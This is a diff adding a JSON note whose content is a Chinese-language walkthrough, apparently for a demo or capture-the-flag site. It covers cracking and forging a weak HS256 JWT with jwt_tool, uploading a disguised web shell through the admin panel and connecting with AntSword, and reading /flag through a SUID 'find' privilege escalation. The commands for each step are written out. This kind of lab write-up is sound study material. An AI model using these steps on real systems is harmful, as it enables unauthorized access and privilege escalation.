@@ -1,1 +1,7 @@
-[]
+[
+  {
+    "id": "1737975163121",
+    "content": "\n\n# cloudever web 演示  \n\n# 实机演示\nhttps://web.cloudever.top/\n/admin\n\n## jwt攻击拿到后台\n\n1. 注册账号\n2. 从js源码中看到后台地址，先访问，发现被拒绝\n3. 获取jwt，放在jwt_tool解析\n   ```python\n   python jwt_tool.py <jwt>\n   ```\n4. 发现是hs256，直接爆破\n   ```python\n   python jwt_tool.py <jwt> -C -d password.txt\n   ```\n5. 发现密钥是123456，直接伪造jwt，放在cookies里\n\n## 后台文件上传\n\n1. 尝试上传php失败\n2. 上传配置文件（讲解配置文件的原理）\n3. 上传.jpg的小马\n4. 蚁剑连接，查看flag，失败，需要提权\n\n## linux提权\n\n1. 查找有suid权限的命令 \n   ```sh\n   find / -perm -u=s -type f 2>/dev/null\n   ```\n2. 发现find有权限，尝试whoami\n   ```sh\n   find `which find` -exec whoami \\;\n   ```\n3. 拿flag\n   ```sh\n   find `which find` -exec cat /flag \\;\n   ```\n   \n   ",
+    "timestamp": "2025-01-27T10:52:43.121Z"
+  }
+]
